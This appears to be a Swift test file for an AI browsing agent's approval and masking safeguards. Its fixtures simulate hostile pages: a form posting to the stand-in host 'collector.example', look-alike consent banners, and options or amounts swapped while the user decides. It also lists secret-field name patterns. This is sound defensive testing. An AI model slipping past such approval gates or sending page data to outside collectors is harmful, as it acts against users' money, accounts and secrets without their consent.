            #expect(hint == "e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855 ba7816bf8f01cfea414140de5dae2223b00361a396177a9cb410ff61f20015ad "
                    + "41edece42d63e8d9bf515a9ba6932e1c20cbc9f5a5d134645adb5db1b9737ea3", "\(hint ?? "")")
        }

        @Test func aLinkIsJudgedByUpToAHundredAndSixtyCharactersOfItsText() async throws {
            let long = "Our local bakery has opened a second shop downtown with fresh bread every morning, seasonal pastries, a small garden for guests, live music on weekends, and a loyalty card, and customers can pay by card or cash"
            let html = """
                <body><a id=a href="/terms" onclick="document.title='a';return false">I agree to the terms and confirm and pay now</a>
                <a id=b href="/cart" onclick="document.title='b';return false">Review the items in your cart one last time before you pay</a>
                <a id=c href="/story" onclick="document.title='c';return false">\(long)</a>
                <a id=d href="/story2" onclick="document.title='d';return false">Read the story of the bakery and its neighbours</a></body>
                """
            let (tab, window, browser) = try await page(html)
            defer { window.close(); browser.windowClosed() }
            try await asking({ prompt in Self.isHigh(prompt) ? .deny : .once }) { stand in
                let read = await call(tab, "read_page").text
                @MainActor func link(_ start: String) -> Int? { read.split(separator: "\n").first { $0.contains("\"\(start)") }.flatMap { number(of: $0) } }
                let agree = try #require(link("I agree to the terms")), review = try #require(link("Review the items"))
                let bakery = try #require(link("Our local bakery")), story = try #require(link("Read the story"))
                #expect((await call(tab, "click", ["element_id": agree])).failed && guarded(stand).count == 1)
                #expect((await call(tab, "click", ["element_id": review])).failed && guarded(stand).count == 2, "a word late in a short sentence")
                #expect(!(await call(tab, "click", ["element_id": bakery])).failed && guarded(stand).count == 2, "a long card of text is judged by its first words")
                #expect(!(await call(tab, "click", ["element_id": story])).failed && guarded(stand).count == 2)
            }
        }

        @Test func aKeyGoesToTheControlThatWasJudgedNotToALinkAroundIt() async throws {
            let html = """
                <body><a id=link href="#top" onkeydown="document.title='key on ' + event.target.id"><span id=inner role=button>Menu</span></a></body>
                """
            let (tab, window, browser) = try await page(html)
            defer { window.close(); browser.windowClosed() }
            let read = await call(tab, "read_page").text
            let menu = try #require(id(ofKind: "button", in: read), "\(read)")
            let pressed = await call(tab, "press_key", ["key": "Enter", "element_id": menu])
            #expect(!pressed.failed, "\(pressed.text)")
            #expect(await evaluate(tab, "return document.title") == "key on inner", "\(read) \(pressed.text)")
        }

        @Test func twoOptionsWithTheSameWordsAreNotTakenForEachOther() async throws {
            let html = """
                <body><div role=listbox aria-label="Choices"><div id=a role=option data-value=a onclick="document.title='chose a'">Delete it</div><div id=b role=option data-value=b onclick="document.title='chose b'">Delete it</div></div></body>
                """
            let (tab, window, browser) = try await page(html)
            defer { window.close(); browser.windowClosed() }
            // The page puts the other option first while the user thinks: same words, not the option that was judged.
            try await asking({ prompt in
                if Self.isHigh(prompt) { tab.webView?.evaluateJavaScript("document.getElementById('a').before(document.getElementById('b'))") }
                return .once
            }) { stand in
                let read = await call(tab, "read_page").text
                let list = try #require(id(of: "Choices", in: read))
                let result = await call(tab, "select_option", ["element_id": list, "option": "Delete it"])
                #expect(guarded(stand).count == 1)
                #expect(result.failed && result.text.contains("changed") && !tab.title.hasPrefix("chose"), "\(result.text)")
            }
        }

        @Test func aDropZoneWithNoWordsIsToldByItsMarkup() async throws {
            let html = """
                <body style="margin:0"><div id=item draggable=true style="position:absolute;left:10px;top:10px;width:60px;height:30px" ondragstart="event.dataTransfer.setData('text','x')">Item</div>
                <div id=trash class="bin" style="position:absolute;left:10px;top:100px;width:60px;height:30px"></div>
                <div id=plain style="position:absolute;left:200px;top:100px;width:60px;height:30px"></div>
                <script>document.getElementById('trash').ondragover = e => e.preventDefault(); document.getElementById('trash').ondrop = () => document.title = 'dropped in the bin';
                document.getElementById('plain').ondragover = e => e.preventDefault(); document.getElementById('plain').ondrop = () => document.title = 'dropped';</script></body>
                """
            let (tab, window, browser) = try await page(html)
            defer { window.close(); browser.windowClosed() }
            try await asking({ _ in .deny }) { stand in
                let read = await call(tab, "read_page").text
                let item = try #require(id(of: "Item", in: read))
                let refused = await call(tab, "drag", ["from_element_id": item, "to_x": 30, "to_y": 110])
                #expect(refused.failed && guarded(stand).count == 1 && tab.title != "dropped in the bin")
                stand.answer = { _ in .once }
                let fine = await call(tab, "drag", ["from_element_id": item, "to_x": 220, "to_y": 110])
                #expect(!fine.failed && guarded(stand).count == 1)
                #expect(await waitUntil { tab.title == "dropped" })
            }
        }

        @Test func aClickInsideAWebComponentIsJudgedByWhatIsInsideIt() async throws {
            let html = """
                <body style="margin:0"><x-card></x-card><script>
                const root = document.querySelector('x-card').attachShadow({mode: 'open'});
                root.innerHTML = '<button style="position:absolute;left:100px;top:50px;width:160px;height:40px" onclick="document.title=\\'deleted\\'">Delete account</button>'
                  + '<button style="position:absolute;left:100px;top:150px;width:160px;height:40px" onclick="document.title=\\'details\\'">Details</button>';
                </script></body>
                """
            let (tab, window, browser) = try await page(html)
            defer { window.close(); browser.windowClosed() }
            await asking({ _ in .deny }) { stand in
                let refused = await call(tab, "click_at", ["x": 150, "y": 70])
                #expect(refused.failed && guarded(stand).count == 1 && guarded(stand)[0].detail.contains("Delete account"), "\(refused.text)")
                #expect(tab.title != "deleted")
                let fine = await call(tab, "click_at", ["x": 150, "y": 170])
                #expect(!fine.failed && fine.text.contains("Details") && guarded(stand).count == 1, "\(fine.text)")
                #expect(await waitUntil { tab.title == "details" })
            }
        }

        @Test func secretsAreToldByTheirNamesInAnyWritingOfThem() async throws {
            let names = ["otpCode", "userPin", "cvv2", "ssn4", "currentPwd", "pincode", "OTPCode", "card_number", "newPassword", "passWord", "PassCode", "passPhrase", "Pass-Phrase", "pass_word", "user.passWd", "loginPassCode2"]
            let html = "<body>" + names.enumerated().map { "<input name=\"\($1)\" value=\"secret\($0)x\" placeholder=\"field \($0)\">" }.joined()
                + "<input name=shipping value=\"visible-ship\"><input name=opinion value=\"visible-opinion\"><input name=spinner value=\"visible-spin\"></body>"
            let (tab, window, browser) = try await page(html)
            defer { window.close(); browser.windowClosed() }
            let read = await call(tab, "read_page").text
            for index in names.indices { #expect(!read.contains("secret\(index)x"), "\(names[index])") }
            #expect(read.contains("visible-ship") && read.contains("visible-opinion") && read.contains("visible-spin"))
        }

        @Test func aFieldInAFrameOfAnotherSiteIsMaskedInThePictureToo() async throws {
            let inner = "<input id=card autocomplete=cc-number value=4242 style=&#39;-webkit-text-security:none&#39;><input id=plain value=fruit>"
            let (tab, window, browser) = try await page("<body><iframe sandbox='allow-scripts' style='width:300px;height:100px' srcdoc='\(inner)'></iframe></body>", host: "outer.test")
            defer { window.close(); browser.windowClosed() }
            var read = ""
            for _ in 0..<100 where !read.contains("fruit") {
                read = await call(tab, "read_page").text
                if !read.contains("fruit") { try await Task.sleep(for: .milliseconds(50)) }
            }
            let view = try #require(tab.webView), frame = try #require(tab.agent.frames.known.first?.frame)
            func security(_ id: String) async -> String {
                await ToolCatalog.run("return getComputedStyle(document.getElementById('\(id)')).webkitTextSecurity", [:], in: view, frame: frame, timeout: 5).content.first?["text"] as? String ?? ""
            }
            #expect(await security("card") == "none")
            await ToolCatalog.runInPageAndFrames(PageScripts.maskSecrets, tab, view)
            let masked = (await security("card"), await security("plain"))
            #expect(masked.0 == "disc" && masked.1 == "none")
            await ToolCatalog.runInPageAndFrames(PageScripts.unmaskSecrets, tab, view)
            #expect(await security("card") == "none")
        }

        @Test func aPictureNotesTheFramesItShowsAsReadAndAFrameThatCantBeAskedCountsAsUnknown() async throws {
            let (tab, window, browser) = try await page("<body><button id=go onclick=\"document.title='went'\">Go</button><iframe sandbox='allow-scripts' style='width:200px;height:80px' srcdoc='<p>Ad</p>'></iframe></body>", host: "outer.test")
            defer { window.close(); browser.windowClosed() }
            let panel = ChatStore.caller
            Approvals.forgetReads(caller: panel)
            defer { Approvals.forgetReads(caller: panel) }
            try await asking({ _ in .once }) { stand in
                let shot = await call(tab, "screenshot", caller: panel)
                #expect(!shot.failed)
                let go = try #require(id(of: "Go", in: (await call(tab, "read_page")).text))
                _ = await call(tab, "click", ["element_id": go], caller: panel)
                let asked = stand.asked.filter { $0.message.contains("use outer.test") }
                #expect(asked.count == 1 && asked[0].detail.contains("a frame of an unknown site"), "\(stand.asked.map(\.detail))")
            }
        }

        @Test func whatAFrameSendsToTheModelIsRecordedAsReadFromItAndAFrameThatShowedNothingSendsNothing() async throws {
            let html = "<body><p>Outer</p><iframe sandbox='allow-scripts' style='width:30px;height:30px' srcdoc='<p>hi</p>'></iframe>"
                + "<iframe sandbox='allow-scripts' style='width:30px;height:30px' srcdoc='<body></body>'></iframe></body>"
            let (tab, window, browser) = try await page(html, host: "outer.test")
            defer { window.close(); browser.windowClosed() }
            let panel = ChatStore.caller
            Approvals.forgetReads(caller: panel)
            defer { Approvals.forgetReads(caller: panel) }
            try await asking({ _ in .once }) { stand in
                var read = ""
                for _ in 0..<100 where !read.contains("--- Frame: about:srcdoc ---") {
                    read = await call(tab, "read_page", caller: panel).text
                    if !read.contains("--- Frame: about:srcdoc ---") { try await Task.sleep(for: .milliseconds(50)) }
                }
                #expect(read.components(separatedBy: "--- Frame: about:srcdoc ---").count == 2 && read.contains("hi"), "only the frame with something in it is sent: \(read)")
                // The frame's two letters came from a site of its own, which the page around it is not.
                #expect(await Approvals.allowInteraction(.act("Clicking “Go”"), on: tab, caller: panel))
                #expect(stand.asked.filter { $0.detail.contains("a frame of an unknown site") }.count == 1, "\(stand.asked.map(\.detail))")
            }
            Approvals.forgetReads(caller: panel)
            let (empty, emptyWindow, emptyBrowser) = try await page("<body><p>Outer</p><iframe sandbox='allow-scripts' style='width:30px;height:30px' srcdoc='<body></body>'></iframe></body>", host: "outer.test")
            defer { emptyWindow.close(); emptyBrowser.windowClosed() }
            try await asking({ _ in .once }) { stand in
                for _ in 0..<20 {
                    let read = await call(empty, "read_page", caller: panel).text
                    #expect(!read.contains("--- Frame: about:srcdoc ---"), "a frame that showed nothing sends nothing")
                    try await Task.sleep(for: .milliseconds(50))
                }
                #expect(await Approvals.allowInteraction(.act("Clicking “Go”"), on: empty, caller: panel))
                #expect(stand.asked.isEmpty, "and is not a site that was read")
            }
        }

        @Test func aFrameThatIsGoneDoesNotStopAWaitForItsTextToGoAway() async throws {
            let inner = "<p>Words in the frame</p>"
            let (tab, window, browser) = try await page("<body><p>Outer</p><iframe sandbox='allow-scripts' style='width:200px;height:80px' srcdoc='\(inner)'></iframe></body>", host: "outer.test")
            defer { window.close(); browser.windowClosed() }
            var read = ""
            for _ in 0..<100 where !read.contains("Words in the frame") {
                read = await call(tab, "read_page").text
                if !read.contains("Words in the frame") { try await Task.sleep(for: .milliseconds(50)) }
            }
            #expect(tab.agent.frames.known.count == 1)
            let there = await call(tab, "wait_for", ["text": "Words in the frame", "timeout": 5])
            #expect(!there.failed, "\(there.text)")
            _ = await evaluate(tab, "document.querySelector('iframe').remove(); return 1")
            let start = Date()
            let gone = await call(tab, "wait_for", ["text": "Words in the frame", "gone": true, "timeout": 12])
            #expect(!gone.failed && gone.text.contains("is gone"), "\(gone.text)")
            #expect(Date().timeIntervalSince(start) < 12, "not after the whole wait")
            #expect(tab.agent.frames.known.isEmpty, "the frame that is gone is not asked again")
        }

        @Test func consentAndSettingsAreAskedAboutAsSuchAndHeadlinesNever() async throws {
            let html = """
                <body><div id="onetrust-banner-sdk">We use cookies. <button id=a onclick="document.title='accepted'">Accept all cookies</button></div>
                <button id=b onclick="document.title='ordered'">Place order</button>
                <a href="https://lab.test/#long">Why we should send fewer emails in the workplace today, a long read from our editors</a>
                <a href="https://lab.test/#promo">Save 20% on shoes</a>
                <a href="https://lab.test/#short">Send feedback</a>
                <button id=c onclick="document.title='saved'">Save</button></body>
                """
            let (tab, window, browser) = try await page(html)
            defer { window.close(); browser.windowClosed() }
            try await asking({ prompt in Self.isHigh(prompt) ? .deny : .once }) { stand in
                let read = await call(tab, "read_page").text
                let accept = try #require(id(of: "Accept all cookies", in: read)), order = try #require(id(of: "Place order", in: read))
                let headline = try #require(read.split(separator: "\n").first { $0.contains("Why we should send fewer emails") }.flatMap(number))
                let promo = try #require(id(of: "Save 20% on shoes", in: read)), feedback = try #require(id(of: "Send feedback", in: read)), save = try #require(id(of: "Save", in: read))
                #expect(!(await call(tab, "click", ["element_id": accept])).failed)
                #expect(consent(stand).count == 1 && consent(stand)[0].detail.contains("“Accept all cookies”") && consent(stand)[0].choices == [.deny, .once, .site], "a consent: asked (an MCP client may allow the site), never as a loss")
                #expect(consent(stand)[0].detail.hasPrefix("lab.test\n\n") && guarded(stand).isEmpty)
                #expect(await waitUntil { tab.title == "accepted" })
                let refused = await call(tab, "click", ["element_id": order])
                #expect(refused.failed && refused.text.contains("declined") && guarded(stand).count == 1 && tab.title != "ordered")
                #expect(guarded(stand)[0].message.contains("undone") && guarded(stand)[0].detail.contains("“Place order”"))
                for link in [headline, promo] { _ = await call(tab, "click", ["element_id": link]) }
                #expect(guarded(stand).count == 1 && consent(stand).count == 1, "a long headline and a promotion are no questions")
                _ = await call(tab, "click", ["element_id": feedback])
                #expect(guarded(stand).count == 2, "a short link called Send is")
                #expect(!(await call(tab, "click", ["element_id": save])).failed)
                #expect(consent(stand).count == 2)
            }
        }

        @Test func onlyAKnownConsentManagersBannerOrACookieNamedButtonMakesAConsentLowTier() async throws {
            // A cookie-named button is the plain low tier. A consent manager's container, which the markup alone vouches for, is asked about
            // every time, without the offer to allow it for the chat and without words that vouch for it.
            let html = """
                <body><div id="onetrust-banner-sdk"><button onclick="document.title='cmp'">Accept</button></div>
                <div class="banner"><button onclick="document.title='named'">Accept cookies</button></div>
                <div id=comments>Great cookie recipe! You are invited to the cookie club.<button onclick="document.title='invited'">Accept invitation</button></div>
                <div id=cookie-banner class=cookie-banner aria-label="Cookie notice">We use cookies.<button onclick="document.title='plain'">Accept</button></div></body>
                """
            let (tab, window, browser) = try await page(html)
            defer { window.close(); browser.windowClosed() }
            try await asking({ _ in .once }) { stand in
                let read = await call(tab, "read_page").text
                let lines = read.split(separator: "\n").filter { $0.contains("] button ") }.compactMap(number)
                #expect(lines.count == 4)
                for element in lines { _ = await call(tab, "click", ["element_id": element]) }
                // Button named for cookies: low tier. Consent manager container: asked every time, on the markup's word alone. UGC text and a
                // page's own look-alike banner: asked every time as a grant.
                #expect(consent(stand).count == 1 && consent(stand)[0].detail.contains("“Accept cookies”"))
                #expect(bannerMarkup(stand).count == 1 && bannerMarkup(stand)[0].choices == [.deny, .once] && bannerMarkup(stand)[0].detail.contains("“Accept”"))
                let said = bannerMarkup(stand)[0].message + bannerMarkup(stand)[0].detail
                #expect(!said.contains("not granting") && !said.contains("not like paying") && !said.contains("setting") && said.contains("markup"), "no words that vouch for it: \(said)")
                #expect(guarded(stand).count == 2)
                #expect(guarded(stand).contains { $0.detail.contains("“Accept invitation”") } && guarded(stand).contains { $0.detail.contains("“Accept”") })
            }
        }

        @Test func aLowTierActionIsAskedOncePerSiteForTheChatByThePanelAndMCPClientsAndEachTimeByTheCommandLine() async throws {
            let html = "<body><div id=onetrust-banner-sdk><button onclick=\"document.title='accepted'\">Accept all cookies</button></div><button onclick=\"document.title='saved'\">Save</button><button onclick=\"document.title='ordered'\">Place order</button></body>"
            let (tab, window, browser) = try await page(html)
            defer { window.close(); browser.windowClosed() }
            let panel = ChatStore.caller
            Approvals.forgetReads(caller: panel)
            defer { for caller in [panel, "mcp-low", "cli"] { Approvals.forgetReads(caller: caller) } }
            try await asking({ prompt in prompt.choices.contains(.site) ? .site : .once }) { stand in
                let read = await call(tab, "read_page", caller: panel).text
                let accept = try #require(id(of: "Accept all cookies", in: read)), save = try #require(id(of: "Save", in: read)), order = try #require(id(of: "Place order", in: read))
                #expect(!(await call(tab, "click", ["element_id": accept], caller: panel)).failed)
                #expect(consent(stand).count == 1 && consent(stand)[0].choices == [.deny, .once, .site])
                #expect(!(await call(tab, "click", ["element_id": save], caller: panel)).failed)
                #expect(consent(stand).count == 1, "allowed on lab.test for this chat: not asked again")
                for _ in 0..<2 { _ = await call(tab, "click", ["element_id": order], caller: panel) }
                #expect(guarded(stand).count == 2 && guarded(stand).allSatisfy { $0.choices == [.deny, .once] }, "what can't be undone is asked every time")
                let client = await call(tab, "click", ["element_id": save], caller: "mcp-low")
                _ = await call(tab, "click", ["element_id": save], caller: "mcp-low")
                #expect(!client.failed && consent(stand).count == 2 && consent(stand)[1].choices == [.deny, .once, .site], "an MCP client can allow the site for its connection, and then isn't asked again")
                for _ in 0..<2 { _ = await call(tab, "click", ["element_id": order], caller: "mcp-low") }
                #expect(guarded(stand).count == 4 && guarded(stand).allSatisfy { $0.choices == [.deny, .once] }, "what can't be undone is asked every time of an MCP client too")
                let command = await call(tab, "click", ["element_id": save], caller: "cli")
                _ = await call(tab, "click", ["element_id": save], caller: "cli")
                #expect(!command.failed && consent(stand).count == 4 && consent(stand).suffix(2).allSatisfy { $0.choices == [.deny, .once] }, "the command line is asked each time")
                Approvals.forgetReads(caller: panel)
                _ = await call(tab, "click", ["element_id": save], caller: panel)
                #expect(consent(stand).count == 5, "a new chat starts over")
            }
        }

        @Test func aFormThatChangesWhenTheTextIsTypedIsNotSubmittedOnTheOldApproval() async throws {
            let html = """
                <body><form action="/post" onsubmit="document.title='posted';return false"><input id=t oninput="document.getElementById('b').disabled = !this.value" placeholder="Say">
                <button id=b disabled>Post</button></form></body>
                """
            let (tab, window, browser) = try await page(html)
            defer { window.close(); browser.windowClosed() }
            try await asking({ _ in .once }) { stand in
                let read = await call(tab, "read_page").text
                let field = try #require(id(of: "Say", in: read))
                let first = await call(tab, "type_text", ["element_id": field, "text": "hello", "submit": true])
                #expect(first.failed && first.text.contains("did not press Enter") && guarded(stand).isEmpty, "\(first.text)")
                let typed = await evaluate(tab, "return document.getElementById('t').value")
                #expect(tab.title != "posted" && typed == "hello")
                let again = await call(tab, "type_text", ["element_id": field, "text": "hello", "submit": true])
                #expect(!again.failed && guarded(stand).count == 1 && guarded(stand)[0].detail.contains("“Post”"), "the button is there now, and is asked about: \(again.text)")
                #expect(await waitUntil { tab.title == "posted" })
            }
        }

        @Test func aKeyOutsideATextFieldKeepsTheNamesOfWhatItIsPressedOnAndDeleteAsksEveryTime() async throws {
            let html = """
                <body><div id=row role=button tabindex=0 aria-label="Mail 1" onkeydown="if (event.key === 'Delete') document.title = 'deleted'">Mail</div>
                <div id=card role=button tabindex=0 aria-label="Send now" onkeydown="if (event.key === 'Enter') document.title = 'sent'">Card</div>
                <div id=nav role=button tabindex=0 aria-label="Menu bar" onkeydown="document.title = 'key ' + event.key">Menu</div>
                <input id=t placeholder="Note"></body>
                """
            let (tab, window, browser) = try await page(html)
            defer { window.close(); browser.windowClosed() }
            try await asking({ prompt in Self.isHigh(prompt) ? .deny : .once }) { stand in
                let read = await call(tab, "read_page").text
                let row = try #require(id(of: "Mail 1", in: read)), card = try #require(id(of: "Send now", in: read)), menu = try #require(id(of: "Menu bar", in: read)), note = try #require(id(of: "Note", in: read))
                #expect((await call(tab, "press_key", ["key": "Delete", "element_id": row])).failed && guarded(stand).count == 1 && tab.title != "deleted", "Delete outside a text field acts by itself")
                #expect((await call(tab, "press_key", ["key": "Enter", "element_id": card])).failed && guarded(stand).count == 2 && guarded(stand)[1].detail.contains("Send now") && tab.title != "sent")
                #expect(!(await call(tab, "press_key", ["key": "ArrowDown", "element_id": menu])).failed && guarded(stand).count == 2, "an arrow is nothing")
                #expect((await call(tab, "press_key", ["key": "ArrowDown", "modifiers": ["meta"], "element_id": menu])).failed && guarded(stand).count == 3, "a combination with meta acts by itself")
                let deleted = await call(tab, "press_key", ["key": "Delete", "element_id": note]), backspaced = await call(tab, "press_key", ["key": "Backspace", "element_id": note])
                #expect(!deleted.failed && !backspaced.failed)
                #expect(guarded(stand).count == 3, "in a text field Delete and Backspace only edit")
            }
        }

        @Test func anAmountOrCountOnWhatAsksEveryTimeIsPartOfWhatWasApproved() async throws {
            let html = "<body><button id=pay onclick=\"document.title='paid'\">Pay $10</button><button id=cart>Cart (3)</button></body>"
            let (tab, window, browser) = try await page(html)
            defer { window.close(); browser.windowClosed() }
            try await asking({ prompt in
                if Self.isHigh(prompt) { tab.webView?.evaluateJavaScript("document.getElementById('pay').textContent = 'Pay $1000'") }
                return .once
            }) { stand in
                let read = await call(tab, "read_page").text
                let pay = try #require(id(of: "Pay $10", in: read)), cart = try #require(id(of: "Cart (3)", in: read))
                let result = await call(tab, "click", ["element_id": pay])
                #expect(result.failed && result.text.contains("changed") && tab.title != "paid", "\(result.text)")
                func facts(_ element: Int) async throws -> [String: Any] {
                    let text = await script(tab, PageScripts.inspect, ["args": ["id": element]])
                    return try #require((try? JSONSerialization.jsonObject(with: Data(text.utf8))) as? [String: Any], "\(text)")
                }
                let before = try await facts(cart)
                _ = await evaluate(tab, "document.getElementById('cart').textContent = 'Cart (4)'; return 1")
                let after = try await facts(cart)
                #expect(before["fp"] as? String == after["fp"] as? String, "a count that changes by itself doesn't stop an action")
                #expect(before["fpExact"] as? String != after["fpExact"] as? String)
            }
        }

        @Test func aPasswordFieldIsKnownFromTheStartEvenIfThePageTurnsItIntoTextBeforeAnythingLooks() async throws {
            let html = "<body><script>const i = document.createElement('input'); i.id = 'p'; i.placeholder = 'Word'; i.type = 'password'; document.body.append(i); i.type = 'text'; i.value = 'hunter2';</script></body>"
            let (tab, window, browser) = try await page(html)
            defer { window.close(); browser.windowClosed() }
            let read = await call(tab, "read_page").text
            #expect(read.contains("(password field)") && !read.contains("hunter2"), "\(read)")
            let field = try #require(id(ofKind: "input[text]", in: read))
            let typed = await call(tab, "type_text", ["element_id": field, "text": "x"])
            #expect(typed.failed && typed.text.contains("password"))
        }

        @Test func fieldsCalledPasswordsByTheirLabelsOrDrawnAsDotsOrNamedPwAreSecretButACheckboxIsNot() async throws {
            let html = """
                <body><label for=x>Your password</label><input id=x>
                <input id=y style="-webkit-text-security: disc" placeholder="Word">
                <input name=pw1 placeholder="Again"><input name=passwd placeholder="Old"><input placeholder="Plain">
                <label><input type=checkbox id=rm> Remember my password</label></body>
                """
            let (tab, window, browser) = try await page(html)
            defer { window.close(); browser.windowClosed() }
            let read = await call(tab, "read_page").text
            let lines = read.split(separator: "\n").filter { $0.hasPrefix("[") && $0.contains("input[") }
            let secrets = lines.filter { $0.contains("(password field)") }.count
            #expect(secrets == 4 && lines.count == 6, "\(read)")
            #expect(!lines.first { $0.contains("\"Plain\"") }!.contains("(password field)"))
            let box = try #require(lines.first { $0.contains("input[checkbox]") }.flatMap(number))
            let facts = await script(tab, PageScripts.inspect, ["args": ["id": box]])
            #expect(facts.contains("\"secret\":false"), "\(facts)")
        }

        @Test func aFormThatSendsItsDataToAnotherSiteIsAskedAboutEveryTimeWithWhereItGoes() async throws {
            let html = """
                <body><form action="https://collector.example/take" onsubmit="document.title='sent';return false"><input placeholder="Name"><button type=submit>Continue</button></form>
                <form action="/local" onsubmit="document.title='local';return false"><input placeholder="City"><button type=submit>Go on</button></form></body>
                """
            let (tab, window, browser) = try await page(html)
            defer { window.close(); browser.windowClosed() }
            try await asking({ _ in .deny }) { stand in
                let read = await call(tab, "read_page").text
                let away = try #require(id(of: "Continue", in: read)), here = try #require(id(of: "Go on", in: read))
                let refused = await call(tab, "click", ["element_id": away])
                #expect(refused.failed && guarded(stand).count == 1 && guarded(stand)[0].detail.contains("collector.example") && tab.title != "sent")
                #expect(guarded(stand)[0].detail.hasPrefix("lab.test\n\n"))
                _ = await call(tab, "click", ["element_id": away])
                #expect(guarded(stand).count == 2, "asked every time")
                stand.answer = { _ in .once }
                #expect(!(await call(tab, "click", ["element_id": here])).failed && guarded(stand).count == 2, "a form to its own site is only asked about when its words say so")
            }
        }

        @Test func aTabApprovedOnOneSiteIsAskedAboutAgainForTheSiteTheDocumentIsOn() async throws {
            let (tab, window, browser) = try await page("<body><button id=go>Go</button></body>")
            defer { window.close(); browser.windowClosed() }
            let behind = browser.openTab(url: URL(string: "https://elsewhere.example/"), activate: true)
            #expect(behind.id != tab.id && browser.activeID != tab.id)
            let webView = try #require(tab.webView)
            let read = await call(tab, "read_page").text
            let go = try #require(id(of: "Go", in: read))
            await asking({ _ in .deny }) { stand in
                do {
                    _ = try await ToolCatalog.aim(["id": go], tab: tab, in: webView, session: Session(caller: "mcp-site", approved: "lab.test"))
                    #expect(stand.asked.isEmpty, "the site the tab was approved for")
                } catch { Issue.record("\(error)") }
                do {
                    _ = try await ToolCatalog.aim(["id": go], tab: tab, in: webView, session: Session(caller: "mcp-site", approved: "other.test"))
                    Issue.record("the document is on another site than the one approved")
                } catch let failure as ToolFailure {
                    #expect(failure.result.isError && stand.asked.count == 1 && stand.asked[0].detail.hasPrefix("lab.test\n\n"))
                } catch { Issue.record("\(error)") }
            }
        }

        @Test func reloadingAPageThatCameFromASubmittedFormIsNotDoneForTheAI() async throws {
            let server = try await TinyServer { method, path in
                switch (method, path) {
                case ("GET", "/form"): return "<body><form method=post action=/take><input name=a value=1><button>Go</button></form></body>"
                case ("POST", "/take"): return "<body><p>Posted once</p></body>"
                default: return "<body><p>Elsewhere</p></body>"
                }
            }
            defer { server.stop() }
            let browser = Browser()
            browser.focused()
            defer { browser.windowClosed() }
            let tab = browser.openTab(url: nil)
            let view = tab.wake()
            let window = OffscreenWindow(view)
            defer { window.close() }
            view.load(URLRequest(url: server.url("/form")))
            #expect(await waitUntil { !view.isLoading && view.url?.path == "/form" })
            _ = try? await view.callAsyncJavaScript("document.forms[0].submit()", contentWorld: .page)
            #expect(await waitUntil { !view.isLoading && view.url?.path == "/take" })
            #expect(server.count("POST") == 1)
            let result = await ToolCatalog.call("reload", ["tab_id": tab.id], caller: "mcp-resubmit")
            let text = result.content.first?["text"] as? String ?? ""
            #expect(result.isError && text.contains("submitted form"), "\(text)")
            try await Task.sleep(for: .milliseconds(300))
            #expect(server.count("POST") == 1, "the form was not sent again")
            #expect(!tab.agentHistoryMove && !tab.resubmitBlocked)
        }

        @Test func whatAFrameThatCouldNotBeReadIsToldAsIsCutAndItsSiteCountsAsRead() async throws {
            let long = "https://tracker-free.example/" + String(repeating: "a", count: 600)
            let (tab, window, browser) = try await page("<body><p>Outer</p><iframe sandbox style='width:200px;height:80px' srcdoc='<p>Hi</p>' src='\(long)'></iframe></body>", host: "outer.test")
            defer { window.close(); browser.windowClosed() }
            let panel = ChatStore.caller
            Approvals.forgetReads(caller: panel)
            defer { Approvals.forgetReads(caller: panel) }
            try await asking({ _ in .once }) { stand in
                let read = await call(tab, "read_page", caller: panel).text
                let line = try #require(read.split(separator: "\n").first { $0.contains("--- Frame: https://tracker-free.example/") })
                #expect(line.count < 320 && line.contains("…") && line.contains("could not be read"), "\(line.count): the address is cut")
                #expect(await Approvals.allowInteraction(.act("Clicking “Go”"), on: tab, caller: panel))
                #expect(stand.asked.count == 1 && stand.asked[0].detail.contains("conversation: tracker-free.example"), "the address it was told is a site it was told of: \(stand.asked.map(\.detail))")
            }
        }

        @Test func aPictureCountsEveryFrameItShowsWhateverTheFrameSaysAboutItselfAndWhoseListsItIsOn() async throws {
            for (name, frame) in [("a frame that says it is empty", "<iframe sandbox='allow-scripts' style='width:200px;height:80px' srcdoc='<body></body>'></iframe>"),
                                  ("one on the ad blocker's lists", "<iframe sandbox style='width:200px;height:80px' src='https://doubleclick.net/slot'></iframe>")] {
                let (tab, window, browser) = try await page("<body><p>Outer</p>\(frame)</body>", host: "outer.test")
                defer { window.close(); browser.windowClosed() }
                let hosts = await ToolCatalog.shownFrameHosts(tab, try #require(tab.webView))
                #expect(hosts == [Approvals.unknownFrame], "\(name): \(hosts)")
            }
        }

        @Test func aFrameIsGreetedByTheAppAndOnlyThatFrameAnswersForItsName() async throws {
            let inner = "<button>Greeted</button>"
            let (tab, window, browser) = try await page("<body><iframe sandbox='allow-scripts' style='width:200px;height:80px' srcdoc='\(inner)'></iframe></body>", host: "outer.test")
            defer { window.close(); browser.windowClosed() }
            var read = ""
            for _ in 0..<100 where !read.contains("Greeted") {
                read = await call(tab, "read_page").text
                if !read.contains("Greeted") { try await Task.sleep(for: .milliseconds(50)) }
            }
            #expect(read.contains("\"Greeted\""))
            let known = tab.agent.frames.known
            #expect(known.count == 1)
            // The page navigates the frame: what the app knew of it is forgotten, and numbers inside it are no longer any use.
            let greeted = try #require(id(of: "Greeted", in: read))
            _ = await evaluate(tab, "document.querySelector('iframe').srcdoc = '<button>Moved</button>'; return 1")
            #expect(await waitUntil { tab.agent.frames.known.isEmpty })
            let stale = await call(tab, "click", ["element_id": greeted])
            #expect(stale.failed, "\(stale.text)")
        }
    }
}

/// The pages the AI is using that nobody is looking at are held in the window behind the page that is shown, by the
/// same host and under the same ownership as the pages in front.
extension SharedAgentState {
    @MainActor @Suite
    struct HeldPageTests {
        private struct Rig {
            var browser: Browser
            var tabs: [Tab]
            var window: NSWindow
            var container: WebViewHost.Container
        }

        /// Tabs with web views in a browser, the first one shown, and a host for the page in front in a window off screen.
        private func rig(_ count: Int = 3) -> Rig {
            let browser = Browser()
            browser.focused()
            let tabs = (0..<count).map { browser.openTab(url: nil, activate: $0 == 0) }
            for tab in tabs { _ = tab.wake() }
            let window = NSWindow(contentRect: NSRect(origin: Headless.origin, size: NSSize(width: 800, height: 600)), styleMask: [.borderless], backing: .buffered, defer: false)
            window.isReleasedWhenClosed = false
            let container = WebViewHost.Container(frame: window.contentView!.bounds)
            container.autoresizingMask = [.width, .height]
            window.contentView!.addSubview(container)
            return Rig(browser: browser, tabs: tabs, window: window, container: container)
        }

        private func finish(_ rig: Rig) {
            rig.window.close()
            rig.browser.windowClosed()
            AgentActivity.shared.runEnded()
        }

        private func host(_ tab: Tab, _ rig: Rig) -> WebViewHost { WebViewHost(tab: tab, browser: rig.browser) }

